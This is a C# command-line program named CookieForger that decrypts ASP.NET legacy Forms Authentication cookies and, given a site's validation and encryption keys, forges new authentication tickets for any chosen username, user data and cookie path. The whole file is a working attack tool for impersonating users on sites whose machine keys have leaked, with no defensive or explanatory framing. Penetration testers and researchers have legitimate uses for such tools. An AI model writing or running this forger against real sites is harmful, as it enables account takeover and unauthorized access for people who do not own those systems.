using System;
using AspNetCore.LegacyAuthCookieCompat;

namespace CookieForger{
    class Program{
        static void Main(string[] args) {
            if (args.Length == 0){
                Console.WriteLine("no arguments provided. usage:");
                Console.WriteLine("--vkey <validationKey> --ekey <encryptionKey> --data <encryptedCookie> [--compatibility]");
                return;
            }

            // always needed args
            string validationKey = null;
            string encryptionKey = null;
            bool compatibilityMode = false;

            // decryption args
            string encryptedCookie = null;

            // encryption args
            string name = "";
            string cookiePath = "/";
            string userData = "";
            int version = 2;

            for (int i = 0; i < args.Length; i++){
                switch (args[i].ToLowerInvariant()){
                    case "--vkey":
                        validationKey = GetNextArg(args, i++);
                        break;
                    case "--ekey":
                        encryptionKey = GetNextArg(args, i++);
                        break;
                    case "--data":
                        encryptedCookie = GetNextArg(args, i++);
                        break;
                    case "--compatibility":
                        compatibilityMode = true;
                        break;
                    case "--name":
                        name = GetNextArg(args, i++);
                        break;
                    case "--cookiePath":
                        cookiePath = GetNextArg(args, i++);
                        break;
                    case "--userData":
                        userData = GetNextArg(args, i++);
                        break;
                    case "--version":
                        version = Int32.Parse(GetNextArg(args, i++));
                        break;
                    default:
                        Console.WriteLine($"unknown argument: {args[i]}");
                        break;
                }
            }

            // validate arguments
            if (string.IsNullOrWhiteSpace(validationKey) ||
                string.IsNullOrWhiteSpace(encryptionKey))
            {
                Console.WriteLine("missing required arguments. usage:");
                Console.WriteLine("--vkey <validationKey> --ekey <encryptionKey> [--data <encryptedCookie>] [--compatibility]");
                return;
            }

            if(!string.IsNullOrWhiteSpace(encryptedCookie)){
                try
                {
                    Decrypt(validationKey, encryptionKey, encryptedCookie, compatibilityMode);
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"an error occurred: {ex.Message}");
                }
            } else {
                try
                {
                    Encrypt(validationKey, encryptionKey, encryptedCookie, compatibilityMode, version, name, userData, cookiePath);
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"an error occurred: {ex.Message}");
                }
            }

        }

        static string GetNextArg(string[] args, int index){
            if (index + 1 < args.Length)
                return args[index + 1];
            throw new ArgumentException($"missing value for argument: {args[index]}");
        }

        static void Decrypt(string validationKey, string decryptionKey,  string encryptedCookie, bool compatibilityMode){
            byte[] decryptionKeyBytes = HexUtils.HexToBinary(decryptionKey);
            byte[] validationKeyBytes = HexUtils.HexToBinary(validationKey);
            var legacyFormsAuthenticationTicketEncryptor = compatibilityMode ? 
                new LegacyFormsAuthenticationTicketEncryptor(decryptionKeyBytes, validationKeyBytes, ShaVersion.Sha1, CompatibilityMode.Framework45) : 
                new LegacyFormsAuthenticationTicketEncryptor(decryptionKeyBytes, validationKeyBytes, ShaVersion.Sha1);

            FormsAuthenticationTicket decryptedTicket = legacyFormsAuthenticationTicketEncryptor.DecryptCookie(encryptedCookie);
            Console.WriteLine("decrypted cookie details:");
            Console.WriteLine($"version: {decryptedTicket.Version}");
            Console.WriteLine($"name: {decryptedTicket.Name}");
            Console.WriteLine($"issue date: {decryptedTicket.IssueDate}");
            Console.WriteLine($"expiration: {decryptedTicket.Expiration}");
            Console.WriteLine($"is persistent: {decryptedTicket.IsPersistent}");
            Console.WriteLine($"user data: {decryptedTicket.UserData}");
            Console.WriteLine($"cookie path: {decryptedTicket.CookiePath}");
        }

        static void Encrypt(string validationKey, string decryptionKey,  string encryptedCookie, bool compatibilityMode, int version, string name, string userData, string cookiePath){
            byte[] decryptionKeyBytes = HexUtils.HexToBinary(decryptionKey);
            byte[] validationKeyBytes = HexUtils.HexToBinary(validationKey);
            var legacyFormsAuthenticationTicketEncryptor = compatibilityMode ? 
                new LegacyFormsAuthenticationTicketEncryptor(decryptionKeyBytes, validationKeyBytes, ShaVersion.Sha1, CompatibilityMode.Framework45) : 
                new LegacyFormsAuthenticationTicketEncryptor(decryptionKeyBytes, validationKeyBytes, ShaVersion.Sha1);
            var issueDate = DateTime.Now;
            var expiryDate = issueDate.AddHours(72);
            var formsAuthenticationTicket = new FormsAuthenticationTicket(version, name, issueDate, expiryDate, false, userData, cookiePath);
            var encryptedText = legacyFormsAuthenticationTicketEncryptor.Encrypt(formsAuthenticationTicket);
            Console.WriteLine(encryptedText);
        }
    }
}
